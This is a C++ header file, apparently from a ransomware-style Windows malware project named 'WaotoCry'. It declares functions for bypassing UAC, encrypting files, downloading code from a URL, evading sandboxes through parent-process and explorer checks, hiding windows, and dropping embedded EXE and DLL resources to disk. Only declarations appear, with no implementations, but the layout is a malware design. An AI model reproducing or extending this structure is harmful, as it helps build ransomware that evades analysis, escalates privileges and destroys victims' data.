#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include  <direct.h>  
#include <tchar.h>
#include "resource.h"
#pragma comment(lib,"URlmon")

#pragma warning(disable :4996)

using namespace std;

#define MAX_SIZE 255

typedef struct 
{
	int Proconn_data;
	int process_break_sendbox;
	char *get_process_dir;
	char process_new_path;
	string process_pid_path;
	string target_process_path;
	string usl_path;

	DWORD get_pid;
}WaotoCry;




//Bypass.cpp
int add_double_data(char new_process_path);

int increase(char start_process);

int BypassUAC();

//Encryption
int Encryption(char process_path);


//Connect
int downnload(string usl);






//Funtions
string password();
void no_windows();
char new_process_path(); //获取当前PROCESS路径
char *Get_Process_in_dir();
string replace_string(string no_replace, string need_relace_string, string befor_replace);//修改字符串内指定字符

//Anti Sendbox
DWORD get_parent_processid(DWORD pid);
DWORD get_explorer_processid();
int determine();
DWORD GetProcesspId(const char* name);
string process_pid_to_path(DWORD process_pid);


//File operation
bool CreateMyFile(char* strFilePath, LPBYTE lpBuffer, DWORD dwSize);
bool CreateEXE(char* strFilePath, int nResourceID, char* strResourceName);
BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//释放DLL到指定目录